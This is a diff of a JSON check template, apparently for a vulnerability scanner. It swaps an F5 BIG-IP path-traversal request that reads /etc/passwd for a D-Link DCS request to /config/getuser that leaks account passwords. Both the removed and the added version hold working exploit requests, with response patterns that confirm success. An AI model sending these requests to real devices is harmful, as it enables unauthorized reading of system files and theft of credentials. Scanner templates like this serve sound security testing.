@@ -1,14 +1,13 @@
 {
-    "Name": "F5_bigip任意文件读取",
-    "Description": "F5_bigip任意文件读取",
-    "Product": "F5_bigip",
+    "Name": "D-Link DCS Information Disclosure",
+    "Description": "D-Link DCS information disclosure, leaks MD5 account passwords",
+    "Product": "D-Link",
     "author": "chumeng",
     "Request":[
-        {
+                {
         "Method": "GET",
-        "Header": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/config/getuser?index=0",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -19,7 +18,7 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "root:x:0:0:root"
+                "Value": "pass="
                 },
                  {
                 "Operation": "code", 
